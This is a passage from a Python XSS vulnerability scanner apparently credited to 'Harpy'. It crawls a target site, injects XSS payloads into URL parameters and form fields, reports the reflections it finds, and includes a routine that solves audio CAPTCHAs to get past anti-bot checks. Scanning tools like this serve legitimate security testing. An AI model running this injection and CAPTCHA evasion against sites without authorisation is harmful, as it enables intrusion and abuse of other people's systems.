            solution = self.solve_audio_captcha(link['href'])
            if solution:
                # Submit the solution
                form = link.find_parent('form')
                if form:
                    form_data = {input_.get('name', ''): input_.get('value', '') for input_ in form.find_all('input')}
                    form_data[link.get('name', 'captcha')] = solution
                    response = self.session.post(form['action'], data=form_data)
                    return response
                    
        print(f"{Fore.RED}[-] Failed to bypass CAPTCHA{Style.RESET_ALL}")
        return response

def test_xss(url, params, payloads, method='get', session=None, verify_ssl=True, timeout=10):
    """Enhanced XSS testing with CAPTCHA bypass"""
    results = []
    analyzer = ResponseAnalyzer()
    session = session or create_session(verify_ssl=verify_ssl, timeout=timeout)
    captcha_bypass = CaptchaBypass(session)
    
    for payload in payloads:
        try:
            # Create a copy of params for each test
            test_params = params.copy()
            
            # Prepare request
            if method.lower() == 'get':
                test_params.update({k: payload for k in test_params})
                response = session.get(url, params=test_params, verify=verify_ssl, timeout=timeout)
            else:
                data = {k: payload for k in params}
                response = session.post(url, data=data, verify=verify_ssl, timeout=timeout)
            
            # Check for and bypass CAPTCHA if present
            response = captcha_bypass.bypass_captcha(response, url)
            
            # Analyze response
            analysis_results = analyzer.analyze_response(response, payload)
            
            if analysis_results['vulnerable']:
                finding = {
                    'url': url,
                    'method': method,
                    'payload': payload,
                    'params': params,
                    'context': analysis_results['context'],
                    'risk_level': analysis_results['risk_level'],
                    'analysis': {
                        'reflection_type': analysis_results['reflection_type'],
                        'dom_sink': analysis_results['dom_sink'],
                        'encoding': analysis_results['encoding'],
                        'filters_bypassed': analysis_results['filters_bypassed'],
                        'context_escape': analysis_results['context_escape']
                    }
                }
                results.append(finding)
                
                # Print real-time feedback
                risk_color = {
                    'Critical': Fore.RED,
                    'High': Fore.MAGENTA,
                    'Medium': Fore.YELLOW,
                    'Low': Fore.GREEN
                }.get(analysis_results['risk_level'], Fore.WHITE)
                
                print(f"{risk_color}[!] Found {analysis_results['risk_level']} risk XSS at {url}{Style.RESET_ALL}")
                print(f"   Context: {analysis_results['context']}")
                print(f"   Payload: {payload}")
                
        except Exception as e:
            print(f"{Fore.RED}[-] Error testing {url}: {str(e)}{Style.RESET_ALL}")
            
    return results

def save_results(successful_payloads, url):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")  # Added microseconds to prevent overwrites
    output = {
        'timestamp': timestamp,
        'target_url': url,
        'findings': successful_payloads
    }
    
    filename = f'output_{timestamp}.txt'
    with open(filename, 'w') as f:
        json.dump(output, f, indent=4)
    print(f"\n{Fore.GREEN}[+] Results saved to {filename}{Style.RESET_ALL}")

def show_final_message():
    print(f"\n{Fore.GREEN}---------------------{Style.RESET_ALL}")
    print(f"{Fore.GREEN}| hope you enjoy it |{Style.RESET_ALL}")
    print(f"{Fore.GREEN}|                   |{Style.RESET_ALL}")
    print(f"{Fore.GREEN}---------------------{Style.RESET_ALL}")

def show_results():
    """Show all collected results"""
    print(f"\n{Fore.CYAN}=== Scan Results ==={Style.RESET_ALL}")
    
    print(f"{Fore.CYAN}Successful URL parameter payloads:{Style.RESET_ALL}")
    if successful_payloads['url_params']:
        for result in successful_payloads['url_params']:
            print(f"{Fore.GREEN}- {result['method']}: {result['payload']}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}None{Style.RESET_ALL}")
        
    print(f"\n{Fore.CYAN}Successful form payloads:{Style.RESET_ALL}")
    if successful_payloads['forms']:
        for result in successful_payloads['forms']:
            method = result.get('method', 'GET')
            url = result.get('url', '')
            payload = result.get('payload', '')
            print(f"{Fore.GREEN}- {method} at {url}: {payload}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}None{Style.RESET_ALL}")

def signal_handler(signum, frame):
    print(f"\n{Fore.YELLOW}[!] Script interrupted. Showing results so far...{Style.RESET_ALL}")
    show_results()
    # Generate reports with current findings
    try:
        if report_gen:
            report_gen.generate_html_report()
            report_gen.generate_json_report()
            report_gen.print_summary()
    except Exception as e:
        print(f"{Fore.RED}[-] Error generating reports: {str(e)}{Style.RESET_ALL}")
    show_final_message()
    sys.exit(0)

def main():
    """Enhanced main function with all features"""
    global successful_payloads, report_gen
    
    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    init()  # Initialize colorama
    
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner with Enhanced Detection')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('-f', '--payloads', help='Optional file containing additional XSS payloads')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-d', '--depth', type=int, default=3, help='Maximum crawl depth')
    parser.add_argument('-m', '--max-urls', type=int, default=100, help='Maximum URLs to scan')
    parser.add_argument('--timeout', type=int, default=30, help='Request timeout in seconds')
    parser.add_argument('--verify-ssl', action='store_true', help='Verify SSL certificates')
    parser.add_argument('--user-agent', help='Custom User-Agent string')
    
    args = parser.parse_args()
    
    # Print banner
    print(f"{Fore.CYAN}+----------------------------------------+")
    print(f"{Fore.CYAN}|     Advanced XSS Vulnerability Scanner    |")
    print(f"{Fore.CYAN}|            By Harpy                       |")
    print(f"{Fore.CYAN}+----------------------------------------+{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Target: {args.url}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Scan depth: {args.depth}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Thread count: {args.threads}{Style.RESET_ALL}")
    
    # Load and generate payloads
    payloads = load_payloads(args.payloads)
    if not payloads:
        print(f"{Fore.RED}[-] No payloads loaded. Exiting.{Style.RESET_ALL}")
        return
    
    # Initialize components
    crawler = WebCrawler(
        base_url=args.url,
        max_depth=args.depth,
        max_urls=args.max_urls,
        threads=args.threads,
        verify_ssl=args.verify_ssl,
        timeout=args.timeout
    )
    
    # Set user agent after initialization if provided
    if args.user_agent:
        crawler.session.headers.update({'User-Agent': args.user_agent})
    
    analyzer = ResponseAnalyzer()
    report_gen = ReportGenerator(args.url)
    
    print(f"{Fore.CYAN}[*] Starting crawl...{Style.RESET_ALL}")
    
    # Start crawling
    crawler.crawl()
    
    print(f"{Fore.GREEN}[+] Crawl completed{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Found {len(crawler.forms_found)} forms{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Found {len(crawler.parameters_found)} unique parameters{Style.RESET_ALL}")
    
    successful_payloads = {'url_params': [], 'forms': []}
    
    # Test parameters in URLs
    for url in crawler.visited_urls:
        params = crawler.extract_parameters(url)
        if params:
            results = test_xss(
                url, 
                params, 
                payloads, 
                session=crawler.session,
                verify_ssl=args.verify_ssl,
                timeout=args.timeout
            )
            if results:
                for result in results:
                    successful_payloads['url_params'].append(result)
                    report_gen.add_finding(
                        url=result['url'],
                        payload=result['payload'],
                        method='GET',
                        context=result['context'],
                        risk_level=result['risk_level'],
                        analysis_results=result['analysis']
                    )
                    
    # Test forms
    for form in crawler.forms_found:
        results = test_xss(
            form['action'],
            {input_['name']: '' for input_ in form['inputs'] if input_['name']},
            payloads,
            form['method'],
            session=crawler.session,
            verify_ssl=args.verify_ssl,
            timeout=args.timeout
        )
        if results:
            for result in results:
                successful_payloads['forms'].append(result)
                report_gen.add_finding(
                    url=result['url'],
                    payload=result['payload'],
                    method=form['method'],
                    context=result['context'],
                    risk_level=result['risk_level'],
                    analysis_results=result['analysis']
                )
    
    # Print summary
    print(f"\n{Fore.CYAN}=== Scan Summary ==={Style.RESET_ALL}")
    print(f"{Fore.CYAN}Successful URL parameter payloads:{Style.RESET_ALL}")
    if successful_payloads['url_params']:
        for result in successful_payloads['url_params']:
            print(f"{Fore.GREEN}- {result['method']}: {result['payload']}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}None{Style.RESET_ALL}")
        
    print(f"\n{Fore.CYAN}Successful form payloads:{Style.RESET_ALL}")
    if successful_payloads['forms']:
        for result in successful_payloads['forms']:
            method = result.get('method', 'GET')
            url = result.get('url', '')
            payload = result.get('payload', '')
            print(f"{Fore.GREEN}- {method} at {url}: {payload}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}None{Style.RESET_ALL}")
        
    # Generate reports
    report_gen.generate_html_report()
    report_gen.generate_json_report()
    report_gen.print_summary()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Script interrupted. Showing results so far...{Style.RESET_ALL}")
        show_results()
        # Generate reports with current findings
        try:
            if report_gen:
                report_gen.generate_html_report()
                report_gen.generate_json_report()
                report_gen.print_summary()
        except Exception as e:
            print(f"{Fore.RED}[-] Error generating reports: {str(e)}{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] An error occurred: {str(e)}{Style.RESET_ALL}")
        show_results()
